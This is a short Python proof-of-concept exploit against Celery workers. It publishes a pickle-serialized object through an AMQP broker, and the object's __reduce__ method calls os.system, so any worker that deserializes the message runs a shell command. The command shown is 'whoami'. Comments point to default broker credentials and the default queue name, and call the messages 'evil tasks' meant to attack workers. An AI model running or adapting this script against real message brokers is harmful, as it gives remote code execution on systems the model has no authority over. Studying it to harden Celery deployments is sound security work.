from kombu import Connection, Producer
import time, os
from concurrent.futures import ThreadPoolExecutor

class RCE:
    def __reduce__(self):
        cmd = ('whoami')
        return os.system, (cmd,)

amqp_url = 'amqp://test:test@127.0.0.1:5672//' # default AMQP creds: guest:guest
queue_name = 'celery' # queue name, CELERY_DEFAULT_QUEUE in celery's app.conf, default is 'celery'
data = RCE()

def publish_message():
    with Connection(amqp_url) as connection:
        producer = Producer(connection)
        producer.publish(
            data,
            routing_key=queue_name,
            serializer='pickle',
            headers={'clock': 1, 'expires': time.time() + 200}
        )

if __name__ == "__main__":
    # number of workers to attack
    # NOTE: that a single worker MIGHT consume 2 evil tasks before the other worker get a chance to.
    num_threads = 1
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(publish_message) for _ in range(num_threads)]
        for future in futures:
            future.result()
    print("All messages published successfully.")
